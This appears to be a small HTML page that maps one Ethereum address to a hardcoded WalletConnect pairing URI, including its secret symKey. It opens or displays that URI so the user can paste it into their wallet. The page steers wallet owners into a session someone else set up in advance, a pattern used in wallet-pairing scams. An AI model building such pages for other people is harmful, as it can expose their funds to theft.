<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DApp Address Connector</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            background-color: #f0f0f0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 90%;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            font-family: monospace;
        }
        button {
            background-color: #1969ff;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.2s;
            margin: 10px 0;
            width: 100%;
        }
        button:hover {
            background-color: #0051f4;
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            background: #f8f9fa;
            word-break: break-all;
        }
        .success {
            color: #0a0;
            background: #e8ffe8 !important;
        }
        .error {
            color: #d00;
            background: #ffe8e8 !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DApp Address Connector</h1>
        <input type="text" id="addressInput" placeholder="Paste Ethereum address (0x...)" />
        <button onclick="handleConnection()">Connect to DApp</button>
        <div id="status"></div>
    </div>

    <script>
        // Your Ethereum address and WalletConnect URL mapping
        const ADDRESS_TO_WC = {
            "0x7a48a40a4369434c37ff3e10653e164009908ce4": "wc:e597203d8a2606ea1d4becb697b9108834b4d215309060894b31e25f95f569b0@2?relay-protocol=irn&symKey=b4afd88f2f713a5fc4b66fb2239626d2b3c160dc5f56af70702974548579305f"
        };

        async function handleConnection() {
            const status = document.getElementById('status');
            const addressInput = document.getElementById('addressInput');
            const address = addressInput.value.toLowerCase().trim();

            try {
                // Validate Ethereum address format
                if (!address.match(/^0x[a-f0-9]{40}$/i)) {
                    throw new Error('Invalid Ethereum address format');
                }

                // Check if address exists in our mapping
                const wcUrl = ADDRESS_TO_WC[address];
                if (!wcUrl) {
                    throw new Error('Address not registered in the system');
                }

                // Create WalletConnect connection
                status.className = 'success';
                status.innerHTML = 'Connecting...';

                // Try direct WalletConnect protocol
                const encodedUri = encodeURIComponent(wcUrl);
                
                // For mobile: try direct protocol first, then fallback to universal link
                if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
                    window.location.href = `wc:?uri=${encodedUri}`;
                    
                    // Show connection details
                    status.innerHTML = `
                        <p>✅ Connection initiated!</p>
                        <p>If your wallet didn't open automatically, copy this WalletConnect URL:</p>
                        <code style="background:#eee;padding:10px;display:block;margin:10px 0;">${wcUrl}</code>
                    `;
                } else {
                    // For desktop: show WalletConnect URL
                    status.innerHTML = `
                        <p>✅ Desktop detected!</p>
                        <p>Open your wallet and paste this WalletConnect URL:</p>
                        <code style="background:#eee;padding:10px;display:block;margin:10px 0;">${wcUrl}</code>
                    `;
                }

            } catch (error) {
                status.className = 'error';
                status.textContent = `Error: ${error.message}`;
            }
        }
    </script>
</body>
</html>
